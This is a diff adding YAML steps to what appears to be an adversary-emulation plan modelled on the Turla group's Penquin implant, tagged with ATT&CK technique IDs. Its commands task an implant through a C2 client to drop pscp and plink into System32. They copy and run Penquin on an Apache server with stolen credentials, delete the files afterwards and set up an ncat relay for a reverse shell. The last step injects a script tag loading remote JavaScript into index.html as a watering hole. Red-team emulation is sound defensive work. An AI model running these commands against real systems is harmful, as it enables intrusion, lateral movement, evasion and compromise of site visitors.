+          ./evalsC2client.py --set-and-complete-task c6f2aa03 '{"id": 4, "payload": "hsperfdata.zip", "payload_dest": "C:\\Windows\\Temp\\tmp504e.tmp", "cmd": "dir C:\\Windows\\Temp\\tmp504e.tmp"}' --task-wait-timeout 60
+
+- id: d760974d-6466-40b9-8532-b6be578428fc
+  name: Download pscp.exe (Adversary)
+  description: |
+    Task the implant to download pscp.exe
+  tactic: Command and Control
+  technique:
+    attack_id: T1105
+    name: "Ingress Tool Transfer"
+  procedure_group: procedure_command_and_control
+  procedure_step: 9.A.2 
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task c6f2aa03 '{"id": 5, "payload": "pscp.exe", "payload_dest": "C:\\Windows\\Temp\\pscp.exe", "cmd": "move C:\\Windows\\Temp\\pscp.exe C:\\Windows\\System32\\pscp.exe && dir C:\\Windows\\System32\\pscp.exe"}' --task-wait-timeout 60
+
+- id: 83a79c7d-721c-44ac-b8d5-d9ba2bc84852
+  name: Copy Penquin to Apache web server (Adversary)
+  description: |
+    Task the implant to copy Penquin to the Apache web server using the third target user's credentials.
+  tactic: Lateral Movement
+  technique:
+    attack_id: T1021.004
+    name: "Remote Services: SSH"
+  procedure_group: procedure_lateral_movement
+  procedure_step: 9.A.3 
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task c6f2aa03 '{"id": 6, "cmd": "echo y | C:\\Windows\\System32\\pscp.exe -pw #{third.target.password} C:\\Windows\\Temp\\tmp504e.tmp #{third.target.user}@#{apache.server.ip}:/tmp/tmp514f524f"}' --task-wait-timeout 60
+
+- id: 4468cc14-8e77-44cd-93de-b892253b3e27
+  name: Download plink.exe (Adversary)
+  description: |
+    Task the implant to download plink.exe
+  tactic: Command and Control
+  technique:
+    attack_id: T1105
+    name: "Ingress Tool Transfer"
+  procedure_group: procedure_command_and_control
+  procedure_step: 9.A.4
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task c6f2aa03 '{"id": 7, "payload": "plink.exe", "payload_dest": "C:\\Windows\\Temp\\plink.exe", "cmd": "move C:\\Windows\\Temp\\plink.exe C:\\Windows\\System32\\plink.exe && dir C:\\Windows\\System32\\plink.exe"}' --task-wait-timeout 60
+
+- id: 8c6a546b-e03b-4761-b422-8eaf40f59580
+  name: Execute Penquin (Adversary)
+  description: |
+    Task the implant to execute Penquin
+  tactic: Lateral Movement
+  technique:
+    attack_id: T1021.004
+    name: "Remote Services: SSH" 
+  procedure_group: procedure_lateral_movement
+  procedure_step: 9.A.5
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task c6f2aa03 '{"id": 8, "cmd": "(echo unzip /tmp/tmp514f524f -d /tmp & echo sudo mv /tmp/hsperfdata /root/hsperfdata & echo sudo /root/hsperfdata & echo exit) | C:\\Windows\\System32\\plink.exe -ssh -l #{third.target.user} -pw #{third.target.password} #{apache.server.ip}"}' --task-wait-timeout 200; sleep 60;
+        timeout: 200
+
+- id: 1fe4de9d-d8d3-4188-8a2a-6ff42394400c
+  name: Clean up downloaded files (Adversary)
+  description: |
+    Task the implant to clean up downloaded files
+  tactic: Defense Evasion
+  technique:
+    attack_id: T1070.004
+    name: "Indicator Removal on Host: File Deletion"
+  procedure_group: procedure_defense_evasion
+  procedure_step: 9.A.6 
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task c6f2aa03 '{"id": 9, "cmd": "del /Q C:\\Windows\\Temp\\tmp504e.tmp C:\\Windows\\System32\\pscp.exe C:\\Windows\\System32\\plink.exe"}' --task-wait-timeout 60
+
+
+# Step 10 - Installation of Watering Hole
+
+- id: 00a08c4d-d023-4b2a-8244-651f37d23e2c
+  name: Ncat listener to connect to Penquin's reverse shell (Adversary)
+  description: |
+    Fork a process to set up a Ncat listener for Penquin's reverse shell to connect to
+  tactic: x
+  technique:
+    attack_id: x
+    name: x
+  procedure_group: x
+  procedure_step: x
+  platforms:
+    linux:
+      proc:
+        command: |
+          exec-background bash -c "mkfifo input_pipe; mkfifo output_pipe; ncat -k -l 12345 0<output_pipe | ncat -lv 8081 1>output_pipe & tail -f input_pipe | ncat localhost 12345 &"
+
+- id: 7086ff8c-da64-4b85-a3ee-6157fc0e0a70
+  name: Send magic packet to Apache server (Adversary)
+  description: |
+    Send the magic packet to the Apache server using the `sendPacket.py` utility
+  tactic: Command and Control
+  technique:
+    attack_id: T1205
+    name: "Traffic Signaling"
+  procedure_group: procedure_command_and_control
+  procedure_step: 10.A.1
+  platforms:
+    linux:
+      sh:
+        command: |
+          sudo -E python3 /opt/day1/turla/Resources/Penquin/sendPacket.py --handler_ip #{attacker.host.ip} --handler_port 8081 --target_ip #{apache.server.ip} --target_port 8080 --payload_type base64
+  input_arguments:
+    attacker.host.ip:
+      description: The ip address of the attacker's host.
+      type: string
+      default: 176.59.15.33
+
+- id: 4b6ed411-6b13-484e-bed6-60b07562d6de
+  name: Add watering hole redirection (Adversary)
+  description: |
+    Send the command to ncat to add the watering hole redirection to `index.html`
+  tactic: Initial Access
+  technique:
+    attack_id: T1189
+    name: "Drive-By Compromise"
+  procedure_group: procedure_initial_access
+  procedure_step: 10.A.4
+  platforms:
+    linux:
+      sh:
+        command: |
+          echo "echo \"<script>if (document.getElementById('xyz')) {{}} else {{ var gam = document.createElement('script'); gam.type = 'text/javascript'; gam.async = true; gam.src = ('http://anto-int.com/counter.js'); var sm = document.getElementsByTagName('script')[0]; sm.parentNode.insertBefore(gam, sm); var fl = document.createElement('span'); fl.id = 'xyz'; var d =  document.getElementsByTagName('div')[0]; d.parentNode.insertBefore(fl, d);}}</script>\" >> /var/www/html/index.html" > input_pipe;
+          echo exit > input_pipe;
+          rm input_pipe output_pipe;
+          ps aux | grep '[n]cat' | awk '{print $2}' | while read line; do kill $line; done
